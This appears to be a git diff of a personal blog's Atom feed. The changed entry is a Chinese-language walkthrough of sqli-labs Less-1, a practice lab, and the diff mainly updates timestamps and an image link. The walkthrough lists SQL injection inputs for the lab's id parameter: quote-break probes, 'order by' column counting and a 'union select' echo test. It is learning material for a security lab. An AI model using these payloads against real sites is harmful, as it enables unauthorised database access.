@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://finsenty54.github.io/"/>
-  <updated>2019-02-28T09:50:31.802Z</updated>
+  <updated>2019-02-28T11:26:40.462Z</updated>
   <id>http://finsenty54.github.io/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="http://finsenty54.github.io/2019/02/27/sqli-labs/"/>
     <id>http://finsenty54.github.io/2019/02/27/sqli-labs/</id>
     <published>2019-02-26T17:01:08.000Z</published>
-    <updated>2019-02-28T09:50:31.802Z</updated>
+    <updated>2019-02-28T11:26:40.462Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="less-1"><a href="#less-1" class="headerlink" title="less 1"></a>less 1</h3><blockquote><p>single 单个的<br>quote 引号<br>变量前面加 <strong>?</strong></p></blockquote><p>在Less-1里的index.php中添加 <code>echo $sql;</code> 可在网页中显示查询代码，<code>echo &quot;&lt;br&gt;&quot;;</code> 表示换行</p><hr><ol><li>输入 <code>?id=1&#39;  and 1=1 --+</code> 没有报错，返回正确结果<br>输入 <code>?id=10&#39;</code> 报错 <code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;10&#39;&#39; LIMIT 0,1&#39; at line 1</code><br>输入<code>?id=1&#39; and a=2 --+</code> 没有正确结果<br>经过这三个步骤说明是字符型注入</li><li>使用order by来判断有几个字段<br>输入<code>?id=1&#39; order by 4--+</code> 报错 <code>Unknown column &#39;4&#39; in &#39;order clause&#39;</code><br>说明有3个字段</li><li><code>LIMIT 0,1</code> 表示结果只显示一行<br>输入<code>?id=-1&#39; union select 1,2,3 --+</code> 看哪个字段可以回显<br><img src="/sqli-labs/first.PNG" alt="first"></li><li></li></ol><hr>]]></content>
+    <content type="html"><![CDATA[<h3 id="less-1"><a href="#less-1" class="headerlink" title="less 1"></a>less 1</h3><blockquote><p>single 单个的<br>quote 引号<br>变量前面加 <strong>?</strong></p></blockquote><p>在Less-1里的index.php中添加 <code>echo $sql;</code> 可在网页中显示查询代码，<code>echo &quot;&lt;br&gt;&quot;;</code> 表示换行</p><hr><ol><li>输入 <code>?id=1&#39;  and 1=1 --+</code> 没有报错，返回正确结果<br>输入 <code>?id=10&#39;</code> 报错 <code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;10&#39;&#39; LIMIT 0,1&#39; at line 1</code><br>输入<code>?id=1&#39; and a=2 --+</code> 没有正确结果<br>经过这三个步骤说明是字符型注入</li><li>使用order by来判断有几个字段<br>输入<code>?id=1&#39; order by 4--+</code> 报错 <code>Unknown column &#39;4&#39; in &#39;order clause&#39;</code><br>说明有3个字段</li><li><p><code>LIMIT 0,1</code> 表示结果只显示一行<br>输入<code>?id=-1&#39; union select 1,2,3 --+</code> 看哪个字段可以回显<br><a href="https://imgchr.com/i/k7xiTg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/k7xiTg.png" alt="k7xiTg.png"></a></p></li><li></li></ol><hr>]]></content>
     
     <summary type="html">
     
